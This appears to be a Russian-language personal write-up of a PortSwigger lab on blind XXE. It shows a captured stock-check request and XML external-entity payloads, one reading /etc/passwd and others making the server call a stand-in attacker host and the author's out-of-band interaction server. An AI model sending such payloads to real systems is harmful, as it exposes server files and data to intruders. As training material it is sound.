#   1  BLIND  XXE

#### лабу решить не смогу пока, так как нужна подписка - но теорию и решения разберу!!! 

----

первое что можно сделать чтобы найти уязвимость bliand xxe - нужно заставить сделать запрос к своему серверу!

1 )  ОБЬЯВИТЬ СУЩНОСТЬ 
```xml
<!DOCTYPE foo [ <!ENTITY myxxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
2 ) ДОБАВИТЬ В ПАРАМЕТРЫ  myxxe 

это заставит сервер сделать запрос на мой сервер!
и проверить логи DNS и HTTP-запросов , если логи есть - значит уязвимость есть.

----

лаба 
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
  Blind XXE с внеполосным взаимодействием

---

ПОКАЗЫВАЮ ТОЛЬКО РЕШЕНИЕ ЛАБЫ без теории

на сайте есть функция проверки числа товаров на складе


```http
POST /product/stock HTTP/2
Host: 0ae100b30322a4da80ff3a8000a5001b.web-security-academy.net
Cookie: session=mqLAf4dCzeoNS6axuXPoKw7llIzrBcfk
Content-Length: 107
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ae100b30322a4da80ff3a8000a5001b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ae100b30322a4da80ff3a8000a5001b.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

видно что сайт отправляет запросы с XML в чистом виде!

можно пробовать сделать запрос 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

запрос  уходит - но ответа нет!

но можно пробовать заставить сервер сделать запрос к моему серверу!

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ljtvrbscclacfvhwsnbp9lora8on34rp54x.oast.fun">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

"http://ljtvrbscclacfvhwsnbp9lora8on34rp54x.oast.fun" это мой сервер 


######  так как лаба меня не пускает 
>(#### Примечание

>Чтобы предотвратить использование платформы Академии для атак третьих лиц, наш брандмауэр блокирует взаимодействие между лабораториями и произвольными внешними системами. Чтобы решить проблему, вы должны использовать публичный сервер Burp Collaborator по умолчанию.)

поэтому я не могу без подписки это решить!

но в логах сервера можно будет просто увидеть весь запрос ко "мне"
это и будет означать, что уязвимость уже есть!
далее можно пытаться получать и другие файлы!



## несмотря на запрет в лабе, решение очень прозрачное и простое!